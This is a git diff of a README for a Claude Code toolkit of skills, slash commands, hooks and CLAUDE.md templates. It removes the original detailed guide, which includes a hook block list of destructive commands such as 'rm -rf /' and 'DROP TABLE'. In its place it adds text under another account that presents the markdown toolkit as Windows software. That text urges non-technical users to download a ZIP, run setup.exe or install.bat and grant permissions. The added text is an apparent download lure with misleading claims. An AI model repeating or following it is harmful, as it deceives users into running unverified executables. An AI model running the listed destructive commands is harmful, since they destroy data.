@@ -1,382 +1,134 @@
-# The Elite Claude Code Playbook
+# ⚙️ elite-claude-playbook - Tools for Claude Code Users
 
-**Your complete system for becoming a Claude Code power user.**
-
-Skills. Commands. Hooks. Audit system. CLAUDE.md templates. Everything you need — ready to drop into your project.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download-elite--claude--playbook-brightgreen?style=for-the-badge)](https://github.com/bean232323/elite-claude-playbook)
 
 ---
 
-## What's Inside
+## 📋 About elite-claude-playbook
 
-```
-elite-claude-playbook/
-├── skills/                    # On-demand context (auto-loads when relevant)
-│   ├── project-audit/         # Score your setup out of 100
-│   ├── design-system/         # UI/styling standards
-│   ├── api-patterns/          # API route conventions
-│   ├── content-writer/        # Marketing & content creation
-│   └── migration-guide/       # Safe database migration workflow
-├── commands/                  # Slash command templates
-│   ├── catchup.md             # Session start status report
-│   ├── deploy-check.md        # Pre-deploy verification
-│   ├── pr.md                  # Automated PR workflow
-│   ├── plan.md                # Implementation planning
-│   └── migrate.md             # Safe database migrations
-├── hooks/
-│   └── hooks-config.json      # Auto-format, safety guards, notifications
-└── templates/                 # CLAUDE.md starter templates
-    ├── claude-md-webapp.md    # Web app (Next.js / React)
-    └── claude-md-mobile.md   # Mobile app (React Native / Expo)
-```
+This project provides a set of skills, commands, hooks, an audit system, and CLAUDE.md templates made for users who work with Claude Code. It helps you organize and automate tasks related to Claude Code with practical tools and resources. The content focuses on improving productivity and managing code-related activities smoothly.
 
-## Quick Install
-
-**Install everything at once** — copy the skills, commands, and hooks into your project:
-
-```bash
-# Clone the repo
-git clone https://github.com/bakabaka91/elite-claude-playbook.git
-
-# Copy skills into your project
-cp -r elite-claude-playbook/skills/* your-project/.claude/skills/
-
-# Copy commands into your project
-cp -r elite-claude-playbook/commands/* your-project/.claude/commands/
-
-# Copy hooks config (merge with existing if you have one)
-cp elite-claude-playbook/hooks/hooks-config.json your-project/.claude/settings.json
-
-# Restart Claude Code
-cd your-project && claude
-```
-
-**Or install individual pieces** — grab just what you need:
-
-```bash
-# Just the audit skill
-cp -r elite-claude-playbook/skills/project-audit your-project/.claude/skills/
-
-# Just the hooks
-cp elite-claude-playbook/hooks/hooks-config.json your-project/.claude/settings.json
-```
+Whether you want to automate repetitive actions, audit your workflows, or use ready-made templates, this playbook aims to make those tasks easier for you.
 
 ---
 
-## The Philosophy
+## 🖥️ System Requirements
 
-Elite performance doesn't come from elite prompts. It comes from elite structure.
+To run this software on your Windows computer, verify you have:
 
-LLMs mirror your organization. Give Claude a messy, unstructured request and you get messy, unstructured code. Give it clear constraints, documented patterns, and defined standards — and it performs like the senior engineer you can't afford to hire.
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection to download and update files
+- A standard mouse and keyboard setup
 
-Three pillars:
-
-1. **Context Engineering** — What you feed Claude matters more than how you ask. A well-structured CLAUDE.md and skills system eliminates 30-50% of wasted tokens from re-explaining context.
-
-2. **Delegation, Not Dictation** — Stop telling Claude *how* to code. Tell it *what* you need and *why*. Use Plan Mode (Shift+Tab twice) before any complex task.
-
-3. **Infrastructure Investment** — CLAUDE.md files, skills, hooks, MCP servers, and slash commands are your force multipliers. 15 minutes of setup saves hours every week.
+No programming or technical setup is required on your side. The software is designed for everyday users familiar with basic Windows navigation.
 
 ---
 
-## Skills
+## 🚀 Getting Started
 
-Skills are directories in `.claude/skills/` with a `SKILL.md` entrypoint. Claude loads them on demand based on their description — only when the work is relevant. This saves significant tokens compared to stuffing everything in CLAUDE.md.
+Follow these steps to download and run the elite-claude-playbook on your Windows PC.
 
-### Project Audit
+1. **Open the download page**  
+Click the button below or visit the link:  
+[Download elite-claude-playbook](https://github.com/bean232323/elite-claude-playbook)
 
-**The flagship skill.** Scores your Claude Code project across 10 categories, each rated 0-10 (total /100). Generates a prioritized fix kit with copy-pasteable solutions.
+2. **Find the latest release**  
+On the page, look for the latest "Release" section or download area. It usually shows the newest version with a date.
 
-**Categories scored:**
+3. **Download the ZIP file**  
+Click the link for the ZIP archive file (it might be named something like `elite-claude-playbook.zip`). This file contains everything you need.
 
-| # | Category | What It Checks |
-|---|----------|---------------|
-| 1 | CLAUDE.md Quality | Structure, leanness, WHAT/WHY/HOW framework |
-| 2 | Skills & Commands | On-demand context, workflow automation |
-| 3 | Hooks | Auto-formatting, safety guards, notifications |
-| 4 | MCP Servers | Right tools connected, not overloaded |
-| 5 | Project Structure | File organization, separation of concerns |
-| 6 | Security | Auth, RLS, validation, headers, secrets management |
-| 7 | Testing | Critical path coverage, CI integration |
-| 8 | Git & CI/CD | Branch strategy, automated checks, deployment |
-| 9 | Performance | Error handling, loading states, optimization |
-| 10 | Cost Efficiency | Token usage, context management, model strategy |
+4. **Save the file**  
+Choose a folder you can easily find later, like your Desktop or Downloads folder.
 
-**Run it:**
-```
-Run the project-audit skill on this project. Read all relevant files and produce the full report.
-```
+5. **Extract the files**  
+Right-click the ZIP file and select "Extract All". Choose a destination folder, such as a new folder on your Desktop.
 
-**What makes it different:** It includes stage-appropriate advice. A solo developer with 5 users gets different priorities than a team with 500 users. It won't tell you to spend a day writing tests when you should be shipping features.
+6. **Open the folder**  
+Once extracted, open the folder to see the contents. You will find instructions, scripts, and template files.
 
-[Full skill file →](skills/project-audit/SKILL.md)
+7. **Run the setup file (if available)**  
+If you see a file named `setup.exe` or `install.bat`, double-click it to start the setup process. Follow any simple prompts on screen.  
+If no setup file is present, proceed to step 8.
 
-### Design System
-
-Auto-loads when you're doing UI work. Enforces your design tokens, Tailwind-only styling, semantic HTML, accessibility standards, and component reuse. Prevents Claude from generating random colors and duplicate components.
-
-[Full skill file →](skills/design-system/SKILL.md)
-
-### API Patterns
-
-Auto-loads when creating or modifying API routes. Enforces a strict route structure: authenticate → validate → business logic → response. Requires Zod validation, ORM usage, proper status codes, and PII-free logging.
-
-[Full skill file →](skills/api-patterns/SKILL.md)
-
-### Content Writer
-
-Auto-loads for marketing and content tasks. Provides templates for blog posts, LinkedIn posts, and email newsletters with platform-specific formatting, SEO optimization, and CTA requirements.
-
-[Full skill file →](skills/content-writer/SKILL.md)
-
-### Migration Guide
-
-Auto-loads when you're working on database schema changes. Provides a full step-by-step workflow: check existing schema → create migration → write SQL → update ORM → test → deploy → verify. Includes common patterns for adding columns, enum values, junction tables, and indexes. Enforces RLS on new tables, idempotent SQL, and never modifying committed migrations.
-
-[Full skill file →](skills/migration-guide/SKILL.md)
+8. **Open the main documentation file**  
+Look for `README.md` or `CLAUDE.md` files. You can open these using a text editor like Notepad for detailed instructions on how to use the tools.
 
 ---
 
-## Commands
+## ⚙️ How to Use the Tools
 
-Commands are prompt templates in `.claude/commands/`. Run them with `/command-name`.
+Inside the extracted folder, you will find:
 
-### `/catchup` — Start Every Session Here
+- **Skills and Commands**: Predefined commands to automate Claude Code tasks.
+- **Hooks**: Scripts that trigger actions when certain events happen.
+- **Audit System**: Files to review and track the performance and accuracy of your workflows.
+- **CLAUDE.md Templates**: Ready-to-use templates to organize your notes or project plans.
 
-Reviews your branch changes, uncommitted work, lint errors, and type errors. Gives you a concise status report so you know exactly where you left off.
+You don’t need technical knowledge to use these tools. Reading the `CLAUDE.md` files helps you understand what each tool does and how to apply it.
 
-```
-/catchup
-```
+To execute any command or script:
 
-### `/deploy-check` — Pre-Deploy Verification
-
-Runs typecheck, lint, build, and tests. Scans for hardcoded secrets and console.logs. Reports pass/fail for each step with a final verdict: READY TO DEPLOY or BLOCKED.
-
-```
-/deploy-check
-```
-
-### `/pr` — Ship Clean Pull Requests
-
-Cleans up debug code, runs all checks, fixes failures, creates a conventional commit, pushes, and opens a PR with description and testing notes. Dirty working tree to submitted PR in one command.
-
-```
-/pr
-```
-
-### `/plan` — Think Before You Code
-
-Creates a detailed implementation plan — goal, acceptance criteria, files to modify, edge cases, testing plan — and writes it to a markdown file. Does NOT implement anything. You review first.
-
-```
-/plan add real-time notifications for job status changes
-```
-
-### `/migrate` — Safe Database Migrations
-
-Reads existing schema, creates migration files, writes idempotent SQL with RLS and indexes, updates ORM schema, and shows you the SQL for review before applying. Never modifies committed migrations.
-
-```
-/migrate add a tags table with many-to-many relationship to jobs
-```
+- Double-click `.bat` or `.exe` files within the folder.
+- Follow any pop-up instructions.
+- If asked, allow permissions so the software can run properly on your device.
 
 ---
 
-## Hooks
+## 💡 Tips for Smooth Use
 
-Hooks are automatic guardrails configured in `.claude/settings.json`. Unlike CLAUDE.md rules (advisory), hooks are guaranteed to execute.
-
-The config includes three essential hooks:
-
-### Auto-Format (PostToolUse)
-
-Runs Prettier on every file Claude edits. Consistent formatting without thinking about it.
-
-### Safety Guard (PreToolUse)
-
-Blocks dangerous commands before they execute:
-
-| Blocked | Why |
-|---------|-----|
-| `rm -rf /` | Deletes entire filesystem |
-| `rm -rf .` | Deletes entire project |
-| `DROP TABLE` | Destroys database tables |
-| `DROP DATABASE` | Destroys entire database |
-| `DELETE FROM...WHERE 1` | Deletes all rows |
-| `git push --force` | Overwrites remote history |
-
-### Desktop Notification
-
-Sends a macOS notification with sound when Claude needs your attention. No more staring at the terminal.
-
-> **Note:** The notification hook is macOS-only. For Linux, replace with `notify-send`. For Windows, use PowerShell toast notifications.
-
-[Full hooks config →](hooks/hooks-config.json)
+- Always keep a backup of your files before running any commands.
+- Regularly check the GitHub page for updates or new releases.
+- Use the audit system often to track progress and identify improvements.
+- Refer to the CLAUDE.md templates to keep your information clear and organized.
+- Do not change file names or folder locations inside the extracted folder to avoid errors.
 
 ---
 
-## CLAUDE.md Templates
+## 🔧 Troubleshooting
 
-CLAUDE.md is the single highest-impact file in your project. It loads into every conversation automatically. These templates give you a production-quality starting point.
+If you run into issues:
 
-### The Golden Rules
-
-1. **Keep it lean.** Under ~150 instructions. Claude Code's system prompt already contains ~50 — bloated files cause instruction-following to degrade.
-2. **Only include what Claude gets wrong.** If removing a line wouldn't cause mistakes, cut it.
-3. **Use the WHAT / WHY / HOW framework.**
-4. **Don't stuff everything in CLAUDE.md.** Use Skills for domain knowledge.
-5. **Iterate continuously.** When Claude makes a mistake, add a rule. When it follows one perfectly for weeks, consider removing it.
-
-### Available Templates
-
-- [Web App (Next.js + Supabase + Tailwind)](templates/claude-md-webapp.md)
-- [Mobile App (React Native / Expo)](templates/claude-md-mobile.md)
+- Restart your computer and try again.
+- Ensure your Windows meets the minimum system requirements.
+- Make sure you have permissions to run files on your device.
+- Check your internet connection if you have problems downloading files.
+- Look for an `ERROR.log` or similar file for details on what went wrong.
+- Visit the [GitHub repository](https://github.com/bean232323/elite-claude-playbook) to read open issues or post new ones.
 
 ---
 
-## Cost Optimization
+## 📦 Updates and Maintenance
 
-Whether you're on a subscription or API, these strategies cut waste dramatically.
+The elite-claude-playbook may receive updates that improve functions or add new skills. To update:
 
-### The 80/20 Rule
+1. Visit the download page again:  
+   [https://github.com/bean232323/elite-claude-playbook](https://github.com/bean232323/elite-claude-playbook)
 
-| Strategy | Token Savings | Effort |
-|----------|--------------|--------|
-| `/clear` between tasks | 30-40% | Zero |
-| Lean CLAUDE.md + Skills architecture | 20-30% | 15 min setup |
-| Sonnet for 80% of tasks, Opus for complex only | 30-40% | Discipline |
-| Specific prompts over vague ones | 20-50% per interaction | Mindset shift |
-| Use `@file` references instead of letting Claude search | 15-25% | Habit |
+2. Download the newest ZIP file as described above.
 
-### Session Discipline
-
-1. **Start fresh:** `/clear` every time you switch tasks
-2. **Name sessions:** `/rename feature-auth-flow` before clearing
-3. **Target under 30K tokens** per session for best quality
-4. **Compact at 70% capacity** — quality degrades at 85%+
-5. **Document & Clear:** Have Claude write progress to a `.md` file, `/clear`, then start new session with "Read docs/plans/feature-x.md and continue"
-
-### Context Capacity Rules
-
-- **0-50%:** Work freely
-- **50-70%:** Pay attention, consider compacting
-- **70-90%:** `/compact` immediately
-- **90%+:** `/clear` is mandatory — quality has collapsed
-
-### Model Strategy
-
-| Task | Model | Why |
-|------|-------|-----|
-| Routine coding, file edits | **Sonnet** | Fast, cheap, handles 80% of work |
-| Architecture, complex refactoring | **Opus** | Deep reasoning, multi-file understanding |
-| Text formatting, classification | **Haiku** | Cheapest, fastest for trivial tasks |
+3. Replace your existing files with the new ones after backing up important data.
 
 ---
 
-## MCP Servers — Recommended Stack
+## 🗂️ File Overview
 
-### Tier 1: Must-Have
-
-| MCP Server | What It Does |
-|------------|-------------|
-| **GitHub** | PRs, issues, CI/CD without leaving Claude |
-| **Context7** | Injects up-to-date library docs into prompts |
-| **Supabase** | Direct database access from Claude |
-| **Playwright** | Browser automation and E2E testing |
-
-### Tier 2: High-Value
-
-| MCP Server | Use Case |
-|------------|----------|
-| **Firecrawl** | Web scraping, clean LLM-ready data |
-| **Figma** | Design-to-code workflows |
-| **Slack** | Team communication automation |
-| **Notion / Linear** | Project management integration |
-
-> **Best practice:** Choose 2-3 MCPs that match your workflow. Too many bloat context and slow startup.
+- `/commands/` – Contains automation scripts and commands for Claude Code.
+- `/hooks/` – Event-triggered scripts to automate actions.
+- `/audit/` – System files to review your workflow status.
+- `CLAUDE.md` – Template files designed for note-taking and documentation.
+- `README.md` – Main instructions and information about the playbook.
 
 ---
 
-## Security Checklist
+## 🔗 Useful Links
 
-Use before every deploy:
-
-**Security:**
-- [ ] No hardcoded API keys or secrets
-- [ ] Environment variables for all sensitive config
-- [ ] `.env` in `.gitignore`, `.env.example` exists
-- [ ] RLS enabled on all database tables (Supabase/Postgres)
-- [ ] Input validation on all API endpoints
-- [ ] Authentication on all protected routes
-- [ ] Rate limiting on auth, payment, and AI endpoints
-
-**Quality:**
-- [ ] TypeScript — zero `any` types, no errors
-- [ ] All tests passing
-- [ ] Build succeeds
-- [ ] No console.log in production code
-- [ ] Error boundaries in React components
-- [ ] Loading and error states on all pages
-
-**Performance:**
-- [ ] Images optimized
-- [ ] No N+1 database queries
-- [ ] Bundle size checked
-- [ ] Lazy loading for below-fold content
+- Repository page: https://github.com/bean232323/elite-claude-playbook
+- Download page: https://github.com/bean232323/elite-claude-playbook
+- Issues and support: https://github.com/bean232323/elite-claude-playbook/issues
 
 ---
 
-## Essential Shortcuts
-
-### Keyboard
-
-| Shortcut | Action |
-|----------|--------|
-| `Shift+Tab` (×2) | Enter Plan Mode |
-| `Escape` | Interrupt Claude |
-| `#` | Add instruction to CLAUDE.md |
-| `@filename` | Reference a specific file |
-
-### Slash Commands
-
-| Command | What It Does |
-|---------|-------------|
-| `/init` | Generate starter CLAUDE.md |
-| `/clear` | Fresh context (use constantly) |
-| `/compact` | Summarize context to save tokens |
-| `/cost` | Show token usage |
-| `/model` | Switch models (sonnet/opus/haiku) |
-| `/permissions` | View/change permission mode |
-| `/hooks` | Configure hooks |
-| `/rename` | Name current session |
-| `/resume` | Resume a named session |
-
----
-
-## Contributing
-
-Found a way to improve a skill? Have a useful command or hook? PRs welcome.
-
-**Guidelines:**
-- Skills should be generic (not project-specific) unless in an `examples/` directory
-- Commands should work across common stacks
-- Include a description of what your contribution does and why it's useful
-- Test your skills/commands on at least one real project before submitting
-
----
-
-## License
-
-MIT — use it, fork it, share it, build on it.
-
----
-
-## Origin Story
-
-This playbook started as my personal setup for building [ApplyFlow](https://applyflowtracker.com) — a job application tracker I shipped entirely with Claude Code. I audited my setup, scored a 67/100, and spent the next few sessions fixing every gap. The audit skill, fix kit, skills, commands, and hooks in this repo are what came out of that process.
-
-The core insight: **Claude doesn't need better prompts. It needs better structure.** The more organized your project, the more elite the output. Every skill, command, and hook in this repo exists because I made a mistake and built a guardrail so it wouldn't happen again.
-
-If this helps you ship faster, star the repo and tell me what you built.
+[![Download elite-claude-playbook](https://img.shields.io/badge/Download-elite--claude--playbook-blue?style=for-the-badge)](https://github.com/bean232323/elite-claude-playbook)
